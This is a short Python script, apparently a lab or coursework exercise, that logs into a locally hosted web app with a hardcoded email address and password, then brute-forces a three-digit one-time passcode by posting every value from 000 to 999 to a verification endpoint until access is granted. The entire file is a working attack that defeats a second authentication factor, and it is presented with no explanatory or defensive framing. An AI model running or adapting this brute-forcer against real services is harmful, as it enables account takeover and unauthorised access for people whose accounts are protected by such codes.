import requests

# Configuration
BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/"
VERIFY_OTP_URL = f"{BASE_URL}/verify_otp_and_grant_access"

# Valid credentials (adjust accordingly)
EMAIL = "mnaeem.bese21seecs@seecs.edu.pk"
PASSWORD = "password"
RESOURCE = "Task"  # Adjust based on your target resource

# Function to log in and get the session
def login():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"Email": EMAIL, "Password": PASSWORD})
    if response.status_code == 200 and "OTP" in response.text:
        print("Login successful. OTP sent to email.")
        return session
    else:
        print("Login failed.")
        return None

import time

def brute_force_otp(session):
    print("Starting OTP brute-force attack...")
    for otp in range(1000):  # 3-digit OTPs range from 000 to 999
        otp_str = f"{otp:03}"  # Format as 3 digits (e.g., 001, 002)
        response = session.post(
            VERIFY_OTP_URL,
            data={"otp": otp_str, "resource": RESOURCE},
        )
        if "access granted" in response.text.lower():  # Check for success message
            print(f"OTP found: {otp_str}")
            print(f"Response: {response.text}")
            return
        else:
            print(f"Trying OTP: {otp_str} - Failed")
        time.sleep(1)  # Add delay (1 second) between requests
    print("Brute-force attack failed. Exhausted all possible OTPs.")


# Main Execution
if __name__ == "__main__":
    session = login()
    if session:
        brute_force_otp(session)
